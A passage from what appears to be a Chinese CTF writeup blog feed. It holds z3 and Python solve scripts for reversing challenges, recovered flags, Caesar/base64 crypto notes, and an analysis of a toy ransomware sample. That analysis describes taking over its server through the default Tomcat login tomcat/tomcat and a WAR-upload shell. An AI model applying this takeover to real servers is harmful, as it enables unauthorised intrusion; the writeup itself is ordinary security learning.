class="hljs-number">53</span> * v61 + <span class="hljs-number">6</span> * v62 + <span class="hljs-number">58</span> * v64 + <span class="hljs-number">36</span> * v65 + v66)</span><br><span class="line">solver.add(target[<span class="hljs-number">15</span>] == <span class="hljs-number">27</span> * v64 + <span class="hljs-number">73</span> * v63 + <span class="hljs-number">12</span> * v62 + <span class="hljs-number">83</span> * v60 + <span class="hljs-number">85</span> * v61 + <span class="hljs-number">96</span> * v65 + <span class="hljs-number">52</span> * v66)</span><br><span class="line">solver.add(target[<span class="hljs-number">16</span>] == <span class="hljs-number">24</span> * v62 + <span class="hljs-number">78</span> * v60 + <span class="hljs-number">53</span> * v61 + <span class="hljs-number">36</span> * v63 + <span class="hljs-number">86</span> * v64 + <span class="hljs-number">25</span> * v65 + <span class="hljs-number">46</span> * v66)</span><br><span class="line">solver.add(target[<span class="hljs-number">17</span>] == <span class="hljs-number">78</span> * v61 + <span class="hljs-number">39</span> * v60 + <span class="hljs-number">52</span> * v62 + <span class="hljs-number">9</span> * v63 + <span class="hljs-number">62</span> * v64 + <span class="hljs-number">37</span> * v65 + <span class="hljs-number">84</span> * v66)</span><br><span class="line">solver.add(target[<span class="hljs-number">18</span>] == <span class="hljs-number">48</span> * v64 + <span class="hljs-number">14</span> * v62 + <span class="hljs-number">23</span> * v60 + <span class="hljs-number">6</span> * v61 + <span class="hljs-number">74</span> * v63 + <span class="hljs-number">12</span> * v65 + <span class="hljs-number">83</span> * v66)</span><br><span class="line">solver.add(target[<span class="hljs-number">19</span>] == <span class="hljs-number">15</span> * v65 + <span class="hljs-number">48</span> * v64 + <span class="hljs-number">92</span> * v62 + <span class="hljs-number">85</span> * v61 + <span class="hljs-number">27</span> * v60 + <span class="hljs-number">42</span> * v63 + <span class="hljs-number">72</span> * v66)</span><br><span class="line">solver.add(target[<span class="hljs-number">20</span>] == <span class="hljs-number">26</span> * v65 + <span class="hljs-number">67</span> * v63 + <span class="hljs-number">6</span> * v61 + <span class="hljs-number">4</span> * v60 + <span class="hljs-number">3</span> * v62 + <span class="hljs-number">68</span> * v66)</span><br><span class="line">solver.add(target[<span class="hljs-number">21</span>] == <span class="hljs-number">34</span> * v70 + <span class="hljs-number">12</span> * v67 + <span class="hljs-number">53</span> * v68 + <span class="hljs-number">6</span> * v69 + <span class="hljs-number">58</span> * v71 + <span class="hljs-number">36</span> * v72 + v73)</span><br><span class="line">solver.add(target[<span class="hljs-number">22</span>] == <span class="hljs-number">27</span> * v71 + <span class="hljs-number">73</span> * v70 + <span class="hljs-number">12</span> * v69 + <span class="hljs-number">83</span> * v67 + <span class="hljs-number">85</span> * v68 + <span class="hljs-number">96</span> * v72 + <span class="hljs-number">52</span> * v73)</span><br><span class="line">solver.add(target[<span class="hljs-number">23</span>] == <span class="hljs-number">24</span> * v69 + <span class="hljs-number">78</span> * v67 + <span class="hljs-number">53</span> * v68 + <span class="hljs-number">36</span> * v70 + <span class="hljs-number">86</span> * v71 + <span class="hljs-number">25</span> * v72 + <span class="hljs-number">46</span> * v73)</span><br><span class="line">solver.add(target[<span class="hljs-number">24</span>] == <span class="hljs-number">78</span> * v68 + <span class="hljs-number">39</span> * v67 + <span class="hljs-number">52</span> * v69 + <span class="hljs-number">9</span> * v70 + <span class="hljs-number">62</span> * v71 + <span class="hljs-number">37</span> * v72 + <span class="hljs-number">84</span> * v73)</span><br><span class="line">solver.add(target[<span class="hljs-number">25</span>] == <span class="hljs-number">48</span> * v71 + <span class="hljs-number">14</span> * v69 + <span class="hljs-number">23</span> * v67 + <span class="hljs-number">6</span> * v68 + <span class="hljs-number">74</span> * v70 + <span class="hljs-number">12</span> * v72 + <span class="hljs-number">83</span> * v73)</span><br><span class="line">solver.add(target[<span class="hljs-number">26</span>] == <span class="hljs-number">15</span> * v72 + <span class="hljs-number">48</span> * v71 + <span class="hljs-number">92</span> * v69 + <span class="hljs-number">85</span> * v68 + <span class="hljs-number">27</span> * v67 + <span class="hljs-number">42</span> * v70 + <span class="hljs-number">72</span> * v73)</span><br><span class="line">solver.add(target[<span class="hljs-number">27</span>] == <span class="hljs-number">26</span> * v72 + <span class="hljs-number">67</span> * v70 + <span class="hljs-number">6</span> * v68 + <span class="hljs-number">4</span> * v67 + <span class="hljs-number">3</span> * v69 + <span class="hljs-number">68</span> * v73)</span><br><span class="line">solver.add(target[<span class="hljs-number">28</span>] == <span class="hljs-number">34</span> * v77 + <span class="hljs-number">12</span> * v74 + <span class="hljs-number">53</span> * v75 + <span class="hljs-number">6</span> * v76 + <span class="hljs-number">58</span> * v78 + <span class="hljs-number">36</span> * v79 + v80)</span><br><span class="line">solver.add(target[<span class="hljs-number">29</span>] == <span class="hljs-number">27</span> * v78 + <span class="hljs-number">73</span> * v77 + <span class="hljs-number">12</span> * v76 + <span class="hljs-number">83</span> * v74 + <span class="hljs-number">85</span> * v75 + <span class="hljs-number">96</span> * v79 + <span class="hljs-number">52</span> * v80)</span><br><span class="line">solver.add(target[<span class="hljs-number">30</span>] == <span class="hljs-number">24</span> * v76 + <span class="hljs-number">78</span> * v74 + <span class="hljs-number">53</span> * v75 + <span class="hljs-number">36</span> * v77 + <span class="hljs-number">86</span> * v78 + <span class="hljs-number">25</span> * v79 + <span class="hljs-number">46</span> * v80)</span><br><span class="line">solver.add(target[<span class="hljs-number">31</span>] == <span class="hljs-number">78</span> * v75 + <span class="hljs-number">39</span> * v74 + <span class="hljs-number">52</span> * v76 + <span class="hljs-number">9</span> * v77 + <span class="hljs-number">62</span> * v78 + <span class="hljs-number">37</span> * v79 + <span class="hljs-number">84</span> * v80)</span><br><span class="line">solver.add(target[<span class="hljs-number">32</span>] == <span class="hljs-number">48</span> * v78 + <span class="hljs-number">14</span> * v76 + <span class="hljs-number">23</span> * v74 + <span class="hljs-number">6</span> * v75 + <span class="hljs-number">74</span> * v77 + <span class="hljs-number">12</span> * v79 + <span class="hljs-number">83</span> * v80)</span><br><span class="line">solver.add(target[<span class="hljs-number">33</span>] == <span class="hljs-number">15</span> * v79 + <span class="hljs-number">48</span> * v78 + <span class="hljs-number">92</span> * v76 + <span class="hljs-number">85</span> * v75 + <span class="hljs-number">27</span> * v74 + <span class="hljs-number">42</span> * v77 + <span class="hljs-number">72</span> * v80)</span><br><span class="line">solver.add(target[<span class="hljs-number">34</span>] == <span class="hljs-number">26</span> * v79 + <span class="hljs-number">67</span> * v77 + <span class="hljs-number">6</span> * v75 + <span class="hljs-number">4</span> * v74 + <span class="hljs-number">3</span> * v76 + <span class="hljs-number">68</span> * v80)</span><br><span class="line">solver.add(target[<span class="hljs-number">35</span>] == <span class="hljs-number">34</span> * v84 + <span class="hljs-number">12</span> * v81 + <span class="hljs-number">53</span> * v82 + <span class="hljs-number">6</span> * v83 + <span class="hljs-number">58</span> * v85 + <span class="hljs-number">36</span> * v86 + v87)</span><br><span class="line">solver.add(target[<span class="hljs-number">36</span>] == <span class="hljs-number">27</span> * v85 + <span class="hljs-number">73</span> * v84 + <span class="hljs-number">12</span> * v83 + <span class="hljs-number">83</span> * v81 + <span class="hljs-number">85</span> * v82 + <span class="hljs-number">96</span> * v86 + <span class="hljs-number">52</span> * v87)</span><br><span class="line">solver.add(target[<span class="hljs-number">37</span>] == <span class="hljs-number">24</span> * v83 + <span class="hljs-number">78</span> * v81 + <span class="hljs-number">53</span> * v82 + <span class="hljs-number">36</span> * v84 + <span class="hljs-number">86</span> * v85 + <span class="hljs-number">25</span> * v86 + <span class="hljs-number">46</span> * v87)</span><br><span class="line">solver.add(target[<span class="hljs-number">38</span>] == <span class="hljs-number">78</span> * v82 + <span class="hljs-number">39</span> * v81 + <span class="hljs-number">52</span> * v83 + <span class="hljs-number">9</span> * v84 + <span class="hljs-number">62</span> * v85 + <span class="hljs-number">37</span> * v86 + <span class="hljs-number">84</span> * v87)</span><br><span class="line">solver.add(target[<span class="hljs-number">39</span>] == <span class="hljs-number">48</span> * v85 + <span class="hljs-number">14</span> * v83 + <span class="hljs-number">23</span> * v81 + <span class="hljs-number">6</span> * v82 + <span class="hljs-number">74</span> * v84 + <span class="hljs-number">12</span> * v86 + <span class="hljs-number">83</span> * v87)</span><br><span class="line">solver.add(target[<span class="hljs-number">40</span>] == <span class="hljs-number">15</span> * v86 + <span class="hljs-number">48</span> * v85 + <span class="hljs-number">92</span> * v83 + <span class="hljs-number">85</span> * v82 + <span class="hljs-number">27</span> * v81 + <span class="hljs-number">42</span> * v84 + <span class="hljs-number">72</span> * v87)</span><br><span class="line">solver.add(target[<span class="hljs-number">41</span>] == <span class="hljs-number">26</span> * v86 + <span class="hljs-number">67</span> * v84 + <span class="hljs-number">6</span> * v82 + <span class="hljs-number">4</span> * v81 + <span class="hljs-number">3</span> * v83 + <span class="hljs-number">68</span> * v87)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">while</span> (solver.check() == sat):</span><br><span class="line">   flag = <span class="hljs-string">""</span></span><br><span class="line">   model = solver.model()</span><br><span class="line">   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">42</span>):</span><br><span class="line">       flag += <span class="hljs-built_in">chr</span>(model[v[i]].as_long())</span><br><span class="line">   <span class="hljs-built_in">print</span>(flag)</span><br><span class="line">   solver.add(RecurOr(v, model))</span><br><span class="line"><span class="hljs-comment"># flag{7e171d43-63b9-4e18-990e-6e14c2afe648}</span></span><br></pre></td></tr></tbody></table></figure><h2 id="hyperthreading"><a href="#hyperthreading" class="headerlink" title="hyperthreading"></a>hyperthreading</h2><p>输入长度为42位的flag，然后创建了新的线程，里面对输入进行了处理，还有反调试，最后进行比较</p><p><img src="/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/image-20200821091520232.png" alt="image-20200821091520232"></p><p>处理过程有一些花指令，去了花指令之后可以看到处理的过程</p><p><img src="/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/image-20200821092126482.png" alt="image-20200821092126482"></p><p>取出其中一位，右移两位和左移六位之后的结果进行异或，然后再异或0x23</p><p><img src="/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/image-20200821092313770.png" alt="image-20200821092313770"></p><p>出来的结果加上0x23</p><p><img src="/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/image-20200821092356200.png" alt="image-20200821092356200"></p><p>索引加一，移向下一位，直接上脚本</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">target = [<span class="hljs-number">0xDD</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>,<span class="hljs-number">0x8B</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x91</span>,<span class="hljs-number">0x92</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x9F</span>]</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(target)):</span><br><span class="line">   target[i] = ((target[i] - <span class="hljs-number">0x23</span>) &amp; <span class="hljs-number">0xff</span>) ^ <span class="hljs-number">0x23</span></span><br><span class="line">   target[i] = ((target[i] &lt;&lt; <span class="hljs-number">2</span>) | (target[i] &gt;&gt; <span class="hljs-number">6</span>)) &amp; <span class="hljs-number">0xff</span></span><br><span class="line"><span class="hljs-comment"># print(target)</span></span><br><span class="line">flag = <span class="hljs-string">""</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> target:</span><br><span class="line">   flag += <span class="hljs-built_in">chr</span>(i)</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># flag{a959951b-76ca-4784-add7-93583251ca92}</span></span><br></pre></td></tr></tbody></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="电脑被黑"><a href="#电脑被黑" class="headerlink" title="电脑被黑"></a>电脑被黑</h2><p>diskgenius挂载虚拟磁盘disk_dump，恢复被删除数据</p><p><img src="/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/image-20200821093045254.png" alt="image-20200821093045254"><br>恢复出了被删除的文件，但是是乱码，打开demo发现文件头elf，这个程序对flag文件进行了处理<br><img src="/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/image-20200821093316861.png" alt="image-20200821093316861"></p><p>上脚本逆向处理一下</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v4 = <span class="hljs-number">34</span></span><br><span class="line">v5 = <span class="hljs-number">0</span></span><br><span class="line">target = [<span class="hljs-number">0x44</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x66</span>,<span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x7E</span>,<span class="hljs-number">0x5B</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xB8</span>]</span><br><span class="line">flag = <span class="hljs-string">""</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> target:</span><br><span class="line">   v6 = i</span><br><span class="line">   flag += <span class="hljs-built_in">chr</span>(((v6 ^ v4) - v5) &amp;amp; <span class="hljs-number">0xff</span>)</span><br><span class="line">   v4 += <span class="hljs-number">34</span></span><br><span class="line">   v5 = (v5 + <span class="hljs-number">2</span>) &amp;amp; <span class="hljs-number">0xF</span></span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br><span class="line"><span class="hljs-comment"># flag{e5d7c4ed-b8f6-4417-8317-b809fc26c047}</span></span><br></pre></td></tr></tbody></table></figure><h2 id="WamaCry1"><a href="#WamaCry1" class="headerlink" title="WamaCry1"></a>WamaCry1</h2><p>简易的勒索病毒，打包处理过，解包之后，查看一下student_unpacked，除了一些根本没用的按钮和输出之外，还调用了son.exe</p><p><img src="/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/image-20200821093629676.png" alt="image-20200821093629676"></p><p>在解包之后的文件中找到这个程序，分析一下程序逻辑<br><img src="/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/image-20200821093904054.png"></p><p>获取电脑名字，生成公钥和私钥对flag进行加密<br><img src="/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/image-20200821093750996.png" alt="image-20200821093750996"></p><p>连接服务器，ip和端口如图，向服务器发送电脑名和私钥</p><p>得到ip以后扫描端口，发现开放8080是tomcat的默认管理页面，尝试弱口令tomcat/tomcat进去项目管理页面，构造war包上传拿到shell，在/tmp/key/文件夹下发现私钥及勒索病毒服务器端</p><p>在服务器段拿到生成的私钥文件和服务器端运行的程序，查看私钥发现经过了处理，分析服务器端程序，先开放端口建立连接<br><img src="/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/image-20200821094420639.png" alt="image-20200821094420639"><br>接收先发送的电脑名称，创建以电脑名命名的文件<br><img src="/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/image-20200821094550871.png" alt="image-20200821094550871"></p><p>rsa私钥有很多行，逐行接收，最关键的处理就是buf和1进行异或，这个异或只影响整数的最后一位，对应转换成的字符串的第一个字符，所以对私钥文件的第一列异或1还原回来</p></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界_Crypto_wp</title>
      <link href="/2020/05/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Crypto-wp/"/>
      <url>/2020/05/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Crypto-wp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>开始学<code>Crypto</code>主要有两个原因，第一还是受了最近两场比赛的影响，安恒月赛的时候真就提前<code>ak</code>了<code>re</code>之后看着掉排名，<code>GKCTF</code>也是只上了单榜；第二就是最近做<code>re</code>的时候，经常会做到最后遇到加密算法还是抓瞎，所以开始接触了密码学的东西，拿<code>Crypto</code>练习练习</p><span id="more"></span><h3 id="新手区"><a href="#新手区" class="headerlink" title="新手区"></a>新手区</h3><h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><p>密文</p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9</span><br></pre></td></tr></tbody></table></figure><p>直接<code>base64</code>解一下就出来了</p><figure class="highlight dust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-xml">cyberpeace</span><span class="hljs-template-variable">{Welcome_to_new_World!}</span></span><br></pre></td></tr></tbody></table></figure><h4 id="Caeser"><a href="#Caeser" class="headerlink" title="Caeser"></a>Caeser</h4><p>密文</p><figure class="highlight perl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oknqdbqmo<span class="hljs-string">q{kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz}</span></span><br></pre></td></tr></tbody></table></figure><p>凯撒密码，正好用到之前信安导论的大作业，<code>Rust is the future!</code></p><figure class="highlight rust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#![allow(dead_code)]</span></span><br><span class="line"><span class="hljs-meta">#![allow(unused)]</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">encrypt</span></span>(s: &amp;<span class="hljs-built_in">str</span>,rot: <span class="hljs-built_in">u8</span>) -&gt; <span class="hljs-built_in">String</span></span><br><span class="line">{</span><br><span class="line">    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> s_ret=<span class="hljs-built_in">String</span>::new();</span><br><span class="line">    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s.chars(){</span><br><span class="line">        <span class="hljs-keyword">if</span>  (<span class="hljs-string">'a'</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>) &lt;= c <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span> &amp;&amp; (c <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>) &lt;= <span class="hljs-string">'z'</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span></span><br><span class="line">        {</span><br><span class="line">            <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> tmp =(c <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>) -(<span class="hljs-string">'a'</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>);</span><br><span class="line">            tmp=(<span class="hljs-number">26</span>+tmp+rot)%<span class="hljs-number">26</span>+<span class="hljs-string">'a'</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>;</span><br><span class="line">            <span class="hljs-keyword">let</span> ch=tmp <span class="hljs-keyword">as</span> <span class="hljs-built_in">char</span>;</span><br><span class="line">            s_ret.push(ch);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">'A'</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>) &lt;= (c <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>) &amp;&amp; (c <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>) &lt;= (<span class="hljs-string">'Z'</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> tmp =(c <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>)-(<span class="hljs-string">'A'</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>);</span><br><span class="line">            tmp=(<span class="hljs-number">26</span>+tmp+rot)%<span class="hljs-number">26</span>+<span class="hljs-string">'A'</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>;</span><br><span class="line">            <span class="hljs-keyword">let</span> ch=tmp <span class="hljs-keyword">as</span> <span class="hljs-built_in">char</span>;</span><br><span class="line">            s_ret.push(ch);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">else</span> {</span><br><span class="line">            s_ret.push(c);</span><br><span class="line">            <span class="hljs-keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    s_ret</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">decrypt</span></span>(s: &amp;<span class="hljs-built_in">str</span>,rot: <span class="hljs-built_in">u8</span>) -&gt; <span class="hljs-built_in">String</span></span><br><span class="line">{</span><br><span class="line">    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> s_ret=<span class="hljs-built_in">String</span>::new();</span><br><span class="line">    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s.chars(){</span><br><span class="line">        <span class="hljs-keyword">if</span>  (<span class="hljs-string">'a'</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>) &lt;= (c <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>) &amp;&amp; (c <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>) &lt;= (<span class="hljs-string">'z'</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> tmp =(c <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>) -(<span class="hljs-string">'a'</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>);</span><br><span class="line">            tmp=(<span class="hljs-number">26</span>+tmp-rot)%<span class="hljs-number">26</span>+<span class="hljs-string">'a'</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>;</span><br><span class="line">            <span class="hljs-comment">// plus 26 to avoid 'attempt to subtract with overflow' error since u8 is unsigned</span></span><br><span class="line">            <span class="hljs-keyword">let</span> ch=tmp <span class="hljs-keyword">as</span> <span class="hljs-built_in">char</span>;</span><br><span class="line">            s_ret.push(ch);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">'A'</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>) &lt;= (c <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>) &amp;&amp; (c <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>) &lt;= (<span class="hljs-string">'Z'</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> tmp =(c <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>)-(<span class="hljs-string">'A'</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>);</span><br><span class="line">            tmp=(<span class="hljs-number">26</span>+tmp-rot)%<span class="hljs-number">26</span>+<span class="hljs-string">'A'</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">u8</span>;</span><br><span class="line">            <span class="hljs-comment">// plus 26 to avoid 'attempt to subtract with overflow' error since u8 is unsigned</span></span><br><span class="line">            <span class="hljs-keyword">let</span> ch=tmp <span class="hljs-keyword">as</span> <span class="hljs-built_in">char</span>;</span><br><span class="line">            s_ret.push(ch);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">else</span> {</span><br><span class="line">            s_ret.push(c);</span><br><span class="line">            <span class="hljs-keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    s_ret</span><br><span class="line">}</span><br><span 